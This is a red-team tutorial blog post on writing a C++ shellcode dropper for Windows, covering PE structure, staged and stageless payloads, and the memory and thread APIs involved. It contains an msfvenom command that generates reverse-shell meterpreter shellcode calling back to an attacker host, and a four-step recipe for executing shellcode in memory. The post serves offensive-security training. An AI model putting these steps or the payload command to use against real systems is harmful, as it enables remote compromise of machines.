---
title: "Malware Development: Writing a C++ dropper"
author: "Trevor Saudi"
date: 2023-07-19
description: "Malware Development: Writing a C++ dropper"
image: "/posts/2023-07-19_red_team01/images/logo.png"
tags:
- Red Teaming
- Malware Development

---
![image](/posts/2023-07-19_red_team02/images/logo.png)


<style>



@import url('https://cdn.rawgit.com/lonekorean/gist-syntax-themes/d49b91b3/stylesheets/one-dark.css');

@import url('https://fonts.googleapis.com/css?family=Open+Sans');


   
  *, ::before, ::after {
    border-style: none;
    font: 16px;
  }



</style>

## Introduction
- Welcome to another red teaming blog post where we dive into malware development and how we can write malware using C/C++. 
- We will go over some fundamentals such as the PE file structure, Windows APIs then finally see how we can put together a dropper that executes shellcode for us on a target system

## Prerequisites

- Windows 10 box
- Any IDE
- Basic programming knowledge


## Why?

- In my red teaming journey, the emphasis on writing custom toolset always plays a big role in understanding the current threat landscape, emulating what adversaries are doing and I guess... it's just fun!

## The PE file structure

- The `portable executable` also called the Windows executable file format is a data structure that in Windows that holds information necessary for the execution of files. 
- It is used to `organize executable files, object files, DLLs, FON Font files` in 32-bit and 64-bit versions of Windows operating systems.
- Understanding the organization of file components in a PE is very important when it comes to the `design and analysis` of malware. 

- In the analysis and development of malware, it is important to be familiar with the PE file structure to understand how malware works on a basic level, what it does from a behavioral analysis point of view, such as how it interacts with the operating system, antivirus or EDR in place and how it communicates externally. etc
- In its simplest form, the PE file format is organized as follows:

    ![image](/posts/2023-07-19_red_team02/images/image1.png)

### Headers

- It takes up the first 64 bytes and holds various metadata about the executable file. 
- Its components include:

 | Component               | Description                                                                                   |
| ----------------------- | --------------------------------------------------------------------------------------------- |
| `DOS Header`            | This section identifies an MS-DOS compatible file type using the "MZ" initials.              |
| `DOS stub`              | This is what prints out "This program cannot be run in DOS mode" when executed in DOS.       |
| `PE File Header`        | Contains the signature that identifies the executable as a PE.                               |
| `Image Optional Header` | Holds optional information about a PE, such as the base address of the image in memory, sizes of the code/data sections, the entry point relative virtual address, etc. |
| `Sections Header`       | Describes attributes of sections in the PE, such as name, size, virtual address, and attributes (readable, writable, executable). |

### Sections
- These are the components that make up the PE sections:

| Component | Description                                    |
| --------- | ---------------------------------------------- |
| `.text`     | Contains executable code.                      |
| `.data`     | Holds initialized data.                         |
| `.bss`      | Stores uninitialized data.                      |
| `.rsrc`     | Stores non-executable resources.                |
| `.idata`    | Lists imported functions and libraries.         |
| `.edata`   | Lists exported functions and symbols.           |
| `.pdata`    | Contains exception handling information.        |
| `.debug`    | Holds debugging-related data.                   |


## Staged vs Stageless

- Both of these are different approaches used in the delivery of malware
- `Stageless malware` is `standalone self-contained malware` that does not rely on external resources to complete execution.
- `Staged malware` follows a different approach. It contains `multiple processes`, usually two or more phases where the first, commonly referred to as the `stager`, is a small piece of code responsible for establishing a C2 connection with the infrastructure. Its main functionality is to `load the subsequent stage of the malware.`
- A common example is the metasploit framework where stageless payloads have the following notation: <kbd>meterpreter_</kbd>:

```
   1. payload/windows/meterpreter_bind_tcp 
```

 - While the staged have the following notation: <kbd>meterpreter/</kbd>:

 
```bash
   2. payload/windows/meterpreter/bind_tcp        
```

- Both have their cons and pros where we see staged payloads being more evasive and capable of bypassing AVs due to execution of malware in separate stages. Stageless is good when maintaining simplicity but can be bulky to deliver. We will look into both ways of developing this malware.

## Processes, Threads, Handles

- A process is a program in execution. It can be made of different multiple threads executing instructions at the same time.
- A thread is the smallest unit of execution within a process. Processes can have multiple threads that share the process's resources.
- A handle is an identifier used to access a resource (files, threads, memory). When a process needs to access resources, the OS will provide a handle that the process will use to access said resources.


## Shellcode 

- Shellcode is a `set of instructions` that is meant to be executed directly by a target system. Once it's executed, it could provide a callback `connection to the attacker or execute arbitrary commands` on the target.
- It is typically written in `assembly`, designed to be super-efficient while leveraging various system calls or APIs to achieve the intended goal
- We can quickly generate shellcode using `msfvenom` as follows:

```bash
➜  ~ msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.100.72 LPORT=443 EXITFUNC=thread -f C

```


## Windows APIs

- Windows APIs play a key role in malware development as they create a standardized interface for the malware `to interact with the Operating System`.
- The `Windows API` is a collection of functions, data structures, and constants provided by the Windows OS. 
- It allows developers to create applications that can interact with the underlying resources.
- The APIs are well documented [here](https://learn.microsoft.com/en-us/docs/) and we will be using it as a reference


### MessageBox API

- We will write our first program that uses a Windows API (MessageBox) to display some text. The implementation of the API is well documented as shown:

    ![image](/posts/2023-07-19_red_team02/images/image7.png)

- In your IDE, we can import the relevant libraries and implement the API as shown in the [docs](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox)
<!-- <iframe
  src="https://carbon.now.sh/embed?bg=rgba%280%2C0%2C202%2C0%29&t=panda-syntax&wt=sharp&l=text%2Fx-c%2B%2Bsrc&width=768&ds=false&dsyoff=20px&dsblur=68px&wc=true&wa=false&pv=0px&ph=0px&ln=false&fl=1&fm=Fira+Code&fs=14px&lh=143%25&si=false&es=2x&wm=false&code=%252F%252F%2520Importing%2520necessary%2520libraries%250A%2523include%2520%253Cwindows.h%253E%250A%250Aint%2520main%28%29%250A%257B%250A%250A%2520%2520%2520%2520%252F%252F%2520Implementing%2520the%2520MessageBox%2520API%250A%2520%2520%2520%2520MessageBox%28NULL%252C%2520L%2522Happy%2520Hacking%2522%252C%2520L%2522Greetings%2522%252C%2520MB_OK%29%253B%250A%2520%2520%2520%2520return%25200%253B%250A%257D"
  style="width: 770px; height: 277px; border:0; transform: scale(1); overflow:hidden;"
  sandbox="allow-scripts allow-same-origin">
</iframe> -->

<script src="https://gist.github.com/trevorsaudi/6f22ac9377b7e913458cd183bbdac8d6.js"></script>

  ![image](/posts/2023-07-19_red_team02/images/gif2.gif)

## High-level Overview

- At a high level, the dropper's implementation to execute shellcode is as follows:

1. Embed the shellcode to the dropper by using a byte array of the raw hex of the shellcode.
2. Allocate memory on a process for the shellcode to be copied into
3. Copy the shellcode into the allocated memory
4. Execute the shellcode 

- Let's move on to the APIs necessary to implement for our dropper.

### [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)

- This API is used in reserving regions of memory within the virtual address space of a process. 

<br>

<iframe
  src="https://carbon.now.sh/embed?bg=rgba%280%2C0%2C202%2C0%29&t=panda-syntax&wt=sharp&l=text%2Fx-c%2B%2Bsrc&width=770.6875&ds=false&dsyoff=20px&dsblur=68px&wc=true&wa=false&pv=0px&ph=0px&ln=false&fl=1&fm=Fira+Code&fs=14px&lh=143%25&si=false&es=2x&wm=false&code=LPVOID%2520VirtualAlloc%28%250A%2520%2520%2520LPVOID%2520lpAddress%252C%2520%2520%2520%2520%252F%252F%2520Starting%2520address%2520of%2520the%2520memory%2520region%2520to%2520allocate.%250A%2520%2520%2520SIZE_T%2520dwSize%252C%2520%2520%2520%2520%2520%2520%2520%252F%252F%2520Size%252C%2520in%2520bytes%252C%2520of%2520the%2520memory%2520region%2520to%2520allocate.%250A%2520%2520%2520DWORD%2520%2520flAllocationType%252C%2520%252F%252F%2520Type%2520of%2520memory%2520allocation%2520%28e.g.%252C%2520MEM_COMMIT%252C%2520MEM_RESERVE%29.%250A%2520%2520%2520DWORD%2520%2520flProtect%2520%2520%2520%2520%2520%2520%2520%252F%252F%2520Page%2520protection%2520for%2520committed%2520pages%2520%28e.g.%252C%2520PAGE_EXECUTE%29.%250A%29%253B%250A"
  style="width: 770px; height: 220px; border:0; transform: scale(1); overflow:hidden;"
  sandbox="allow-scripts allow-same-origin">
</iframe>


- We will use this to allocate the necessary space for storing the shellcode.


### [RtlMoveMemory](https://learn.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory)

- This memory manipulation function is used to copy a block of memory from one location to another. 


<iframe
  src="https://carbon.now.sh/embed?bg=rgba%280%2C0%2C202%2C0%29&t=panda-syntax&wt=sharp&l=text%2Fx-c%2B%2Bsrc&width=770.6875&ds=false&dsyoff=20px&dsblur=68px&wc=true&wa=false&pv=0px&ph=0px&ln=false&fl=1&fm=Fira+Code&fs=14px&lh=143%25&si=false&es=2x&wm=false&code=void%2520RtlMoveMemory%28%250A%2520%2520%2520void*%2520Destination%252C%2520%2520%2520%252F%252F%2520Pointer%2520to%2520the%2520destination%2520memory%2520block.%250A%2520%2520%2520const%2520void*%2520Source%252C%2520%2520%252F%252F%2520Pointer%2520to%2520the%2520source%2520memory%2520block.%250A%2520%2520%2520SIZE_T%2520Length%2520%2520%2520%2520%2520%2520%2520%2520%2520%252F%252F%2520Number%2520of%2520bytes%2520to%2520copy%2520from%2520the%2520source%2520to%2520the%2520destination.%250A%29%253B"
  style="width: 770px; height: 220px; border:0; transform: scale(1); overflow:hidden;"
  sandbox="allow-scripts allow-same-origin">
</iframe>

- We will use this to copy the shellcode into the memory allocated by VirtualAlloc
### [VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)


- The `VirtualProtect` function changes the protection settings of a region of virtual memory. We will use it to modify permissions of the memory block we copied our shellcode to, in this case, we add executable and read permissions to be able to execute our shellcode


<iframe
  src="https://carbon.now.sh/embed?bg=rgba%280%2C0%2C202%2C0%29&t=panda-syntax&wt=sharp&l=text%2Fx-c%2B%2Bsrc&width=770.6875&ds=false&dsyoff=20px&dsblur=68px&wc=true&wa=false&pv=0px&ph=0px&ln=false&fl=1&fm=Fira+Code&fs=14px&lh=143%25&si=false&es=2x&wm=false&code=BOOL%2520VirtualProtect%28%250A%2520%2520%2520LPVOID%2520lpAddress%252C%2520%2520%2520%2520%2520%252F%252F%2520Pointer%2520to%2520the%2520base%2520address%2520of%2520the%2520region%2520of%2520pages%2520to%2520change%2520protection.%250A%2520%2520%2520SIZE_T%2520dwSize%252C%2520%2520%2520%2520%2520%2520%2520%2520%252F%252F%2520Size%2520of%2520the%2520memory%2520region%2520whose%2520protection%2520attributes%2520will%2520be%2520changed.%250A%2520%2520%2520DWORD%2520flNewProtect%252C%2520%2520%2520%252F%252F%2520New%2520memory%2520protection%2520option%2520%28e.g.%252C%2520PAGE_EXECUTE_READ%252C%2520PAGE_READWRITE%29.%250A%2520%2520%2520PDWORD%2520lpflOldProtect%2520%252F%252F%2520Pointer%2520to%2520a%2520variable%2520that%2520will%2520receive%2520the%2520previous%2520protection%2520option.%250A%29%253B%250A"
  style="width: 770px; height: 350px; border:0; transform: scale(1); overflow:hidden;"
  sandbox="allow-scripts allow-same-origin">
</iframe>

### [CreateThread](//https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread)

- We use this to create a thread that is executed within the address space of another process. This is what runs our shellcode.


<iframe
  src="https://carbon.now.sh/embed?bg=rgba%280%2C0%2C202%2C0%29&t=panda-syntax&wt=sharp&l=text%2Fx-c%2B%2Bsrc&width=770.6875&ds=false&dsyoff=20px&dsblur=68px&wc=true&wa=false&pv=0px&ph=0px&ln=false&fl=1&fm=Fira+Code&fs=14px&lh=143%25&si=false&es=2x&wm=false&code=HANDLE%2520CreateThread%28%250A%2520%2520%2520LPSECURITY_ATTRIBUTES%2520lpThreadAttributes%252C%2520%252F%252F%2520Pointer%2520to%2520the%2520thread%27s%2520security%2520attributes%2520%28can%2520be%2520NULL%29.%250A%2520%2520%2520SIZE_T%2520dwStackSize%252C%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%252F%252F%2520Initial%2520size%2520of%2520the%2520stack%252C%2520in%2520bytes%2520%280%2520uses%2520default%2520size%29.%250A%2520%2520%2520LPTHREAD_START_ROUTINE%2520lpStartAddress%252C%2520%2520%2520%2520%252F%252F%2520Thread%2520function%2520-%2520starting%2520address.%250A%2520%2520%2520LPVOID%2520lpParameter%252C%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%252F%252F%2520Optional%2520parameter%2520passed%2520to%2520the%2520thread%2520function.%250A%2520%2520%2520DWORD%2520dwCreationFlags%252C%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%252F%252F%2520Creation%2520flags%2520%28e.g.%252C%2520CREATE_SUSPENDED%252C%25200%2520for%2520no%2520flags%29.%250A%2520%2520%2520LPDWORD%2520lpThreadId%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%252F%252F%2520Pointer%2520to%2520a%2520variable%2520that%2520will%2520receive%2520the%2520thread%2520identifier.%250A%29%253B%250A"
  style="width: 770px; height: 350px; border:0; transform: scale(1); overflow:hidden;"
  sandbox="allow-scripts allow-same-origin">
</iframe>

### [WaitForSingleObject](//https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject)


- It is used to wait until the specified object is in a certain state or until a timeout interval elapses. We use this to have our shellcode running infinitely till a failure is encountered

<iframe
  src="https://carbon.now.sh/embed?bg=rgba%280%2C0%2C202%2C0%29&t=panda-syntax&wt=sharp&l=text%2Fx-c%2B%2Bsrc&width=770.6875&ds=false&dsyoff=20px&dsblur=68px&wc=true&wa=false&pv=0px&ph=0px&ln=false&fl=1&fm=Fira+Code&fs=14px&lh=143%25&si=false&es=2x&wm=false&code=DWORD%2520WaitForSingleObject%28%250A%2520%2520%2520HANDLE%2520hHandle%252C%2520%2520%2520%2520%2520%2520%2520%252F%252F%2520Handle%2520to%2520the%2520object%2520to%2520wait%2520for%2520%28e.g.%252C%2520a%2520thread%2520handle%252C%2520process%2520handle%29.%250A%2520%2520%2520DWORD%2520dwMilliseconds%2520%2520%252F%252F%2520Maximum%2520time%2520to%2520wait%2520for%2520the%2520object%2520%28in%2520milliseconds%29%252C%2520or%2520INFINITE%2520for%2520no%2520timeout.%250A%29%253B"
  style="width: 770px; height: 220px; border:0; transform: scale(1); overflow:hidden;"
  sandbox="allow-scripts allow-same-origin">
</iframe>

## The Stageless implant


- Putting together the above APIs, we have the following C++ stageless implant that executes shellcode for us.


{{< alert >}}

Note that some of the APIs have optional parameters in which we don't have to put values, we put a 0 in place
{{< /alert >}}

<br>

<script src="https://gist.github.com/trevorsaudi/7a1b06437f2b7ae9c9b8e76398571a32.js"></script>

![image](/posts/2023-07-19_red_team02/images/gif1.gif)

## Exercise

- You can build upon the above code by making it staged, such that it pulls shellcode from a remote source, loads it into a byte array then proceeds with the execution routine.
